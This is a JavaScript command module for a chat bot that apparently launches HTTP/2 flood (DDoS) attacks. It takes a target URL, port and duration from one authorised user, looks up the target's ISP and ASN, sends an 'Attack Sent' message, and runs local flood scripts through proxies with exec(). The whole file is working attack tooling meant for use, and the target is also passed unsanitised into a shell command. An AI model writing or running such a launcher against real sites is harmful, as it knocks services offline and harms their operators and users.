const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = 7330654183;

module.exports = {
  command: ["h2-rob"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (senderId !== allowedId) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command "https"

    if (args.length < 3) {
      return client.sendMessage(message.chatId, {
        message: "❌ Masukkan target, port, dan durasi.\n\nContoh:\nh2-rob https://example.com 443 60",
        replyTo: message.id,
      });
    }

    const [target, port, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
╭━✧「 <b>H2-ROB Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
┃⏱️ <b>Duration:</b> ${duration}s
┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
┃⚡ <b>Method:</b> H2-ROB 
┃🏢 <b>ISP:</b> ${info.isp}
┃🏷️ <b>ASN:</b> ${info.as}
┃🌍 <b>IP:</b> ${info.query}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
</blockquote>`;

    await client.sendMessage(message.chatId, {
      file: "https://files.catbox.moe/uvz9xe.mp4",
      message: caption,
      parseMode: "html",
      replyTo: message.id,
    });
    const h2rob = path.join(__dirname, `../lib/cache/h2-rob`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${h2rob} ${target} ${duration} 64 16 proxy.txt`);
  },
};